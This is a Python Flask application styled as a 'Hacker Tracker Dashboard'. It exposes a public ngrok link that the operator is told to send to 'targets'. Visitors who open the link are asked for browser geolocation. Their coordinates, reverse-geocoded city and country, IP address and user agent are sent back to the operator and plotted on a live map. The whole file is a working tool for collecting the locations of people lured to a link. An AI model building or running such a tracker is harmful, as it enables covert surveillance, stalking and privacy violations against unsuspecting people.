from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from pyngrok import ngrok
import time

app = Flask(__name__)
CORS(app)

visits = []

# Start ngrok tunnel safely
try:
    tunnel = ngrok.connect(5000)
    public_url = tunnel.public_url
    print(f"Ngrok public URL: {public_url}")
except Exception as e:
    print(f"Ngrok failed to start: {e}")
    public_url = "http://localhost:5000"

dashboard_html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>📍 Hacker Tracker Dashboard</title>
<style>
  /* Dark hacker style theme */
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

  body {
    margin: 0; padding: 20px; 
    background: #0f111a;
    color: #00ff99;
    font-family: 'Share Tech Mono', monospace;
    user-select: none;
  }
  h1 {
    text-align: center;
    font-size: 3rem;
    color: #00ffcc;
    text-shadow: 0 0 8px #00ffcc;
    margin-bottom: 5px;
  }
  p {
    text-align: center;
    font-size: 1.2rem;
    color: #00ccaa;
    margin-top: 0;
  }
  a {
    color: #00ffcc;
    text-decoration: none;
    font-weight: bold;
  }
  a:hover {
    text-decoration: underline;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 25px;
    background: #121822;
    box-shadow: 0 0 15px #00ffcc66;
  }
  th, td {
    border: 1px solid #004d33;
    padding: 10px 12px;
    text-align: left;
    color: #00ff99;
  }
  th {
    background: #002211;
    font-size: 1.1rem;
    letter-spacing: 1.2px;
    text-transform: uppercase;
    box-shadow: inset 0 -3px 8px #00ffccaa;
  }
  tbody tr:hover {
    background: #004d33aa;
    cursor: pointer;
  }
  #map {
    margin-top: 30px;
    height: 400px;
    border: 2px solid #00ffcc;
    box-shadow: 0 0 20px #00ffccaa;
    border-radius: 8px;
  }
  /* Scrollbar style */
  ::-webkit-scrollbar {
    width: 10px;
    height: 10px;
  }
  ::-webkit-scrollbar-track {
    background: #0f111a;
  }
  ::-webkit-scrollbar-thumb {
    background: #00ff99;
    border-radius: 10px;
  }
</style>

<!-- Leaflet CSS -->
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
</head>
<body>

<h1>🕵️‍♂️ Hacker Tracker Dashboard</h1>
<p>Send this tracking URL to targets: <a href="{{ url }}/click" target="_blank">{{ url }}/click</a></p>

<table>
  <thead>
    <tr>
      <th>Timestamp</th>
      <th>IP</th>
      <th>User Agent</th>
      <th>City</th>
      <th>Country</th>
      <th>Latitude</th>
      <th>Longitude</th>
    </tr>
  </thead>
  <tbody id="logTable"></tbody>
</table>

<div id="map"></div>

<!-- Leaflet JS -->
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script>
  // Initialize map with dark tile layer
  let map = L.map('map').setView([20,0], 2);

  // Use a dark tile layer from CartoDB Voyager Night or other dark theme
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      maxZoom: 19,
      attribution: '&copy; <a href="https://carto.com/">CartoDB</a>, &copy; OpenStreetMap contributors'
  }).addTo(map);

  let markers = [];

  async function fetchVisits() {
    try {
      const res = await fetch('/visits');
      const data = await res.json();
      updateTable(data);
    } catch (e) {
      console.error('Error fetching visits:', e);
    }
  }

  function updateTable(data) {
    const tbody = document.getElementById('logTable');

    // Clear old markers
    markers.forEach(m => map.removeLayer(m));
    markers = [];

    let html = "";
    data.forEach(v => {
      const uaShort = v.user_agent.length > 40 ? v.user_agent.slice(0, 37) + '...' : v.user_agent;
      html += `
        <tr>
          <td>${v.timestamp}</td>
          <td>${v.ip}</td>
          <td title="${v.user_agent}">${uaShort}</td>
          <td>${v.city || '-'}</td>
          <td>${v.country || '-'}</td>
          <td>${v.latitude || '-'}</td>
          <td>${v.longitude || '-'}</td>
        </tr>
      `;
      if (v.latitude && v.longitude) {
        let marker = L.circleMarker([v.latitude, v.longitude], {
          color: '#00ff99',
          radius: 8,
          fillColor: '#00ff99',
          fillOpacity: 0.7,
          weight: 1.5,
          className: 'glow'
        }).addTo(map)
          .bindPopup(`<b>${v.city || 'Unknown City'}</b>, ${v.country || 'Unknown Country'}<br>IP: ${v.ip}`);
        markers.push(marker);
      }
    });
    tbody.innerHTML = html;

    if (markers.length) {
      let group = L.featureGroup(markers);
      map.fitBounds(group.getBounds().pad(0.3));
    }
  }

  setInterval(fetchVisits, 10000);
  fetchVisits();
</script>

</body>
</html>
"""

click_html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Location Capture</title>
<style>
  body {
    background: #0f111a;
    color: #00ff99;
    font-family: 'Share Tech Mono', monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    flex-direction: column;
    user-select: none;
  }
  h2 {
    font-size: 2rem;
    text-shadow: 0 0 10px #00ff99;
  }
  h3 {
    margin-top: 20px;
    font-weight: normal;
  }
</style>
</head>
<body>

<h2>Acquiring your location...</h2>

<script>
async function sendLocation(position) {
  try {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    // Reverse geocode with Nominatim
    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
    const geoData = await geoRes.json();

    const city = geoData.address.city || geoData.address.town || geoData.address.village || '';
    const country = geoData.address.country || '';

    const payload = {
      latitude: lat,
      longitude: lon,
      city,
      country
    };

    await fetch('/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });

    document.body.innerHTML = "<h3>Location sent successfully! Thank you.</h3>";
  } catch (e) {
    console.error(e);
    document.body.innerHTML = "<h3>Failed to send location.</h3>";
  }
}

function error() {
  document.body.innerHTML = "<h3>Geolocation not allowed or failed.</h3>";
}

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(sendLocation, error);
} else {
  error();
}
</script>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(dashboard_html, url=public_url)

@app.route('/click')
def click():
    return render_template_string(click_html)

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        visit = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'city': data.get('city', ''),
            'country': data.get('country', ''),
            'latitude': data.get('latitude', None),
            'longitude': data.get('longitude', None)
        }
        visits.append(visit)
        print(f"[+] New visit recorded: {visit}")
        print(f"[DEBUG] Total visits: {len(visits)}")
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"[!] Error collecting visit: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/visits')
def get_visits():
    return jsonify(visits)

if __name__ == '__main__':
    print(f"Dashboard running at: {public_url}")
    print(f"Tracking URL: {public_url}/click")
    app.run(port=5000, debug=True)
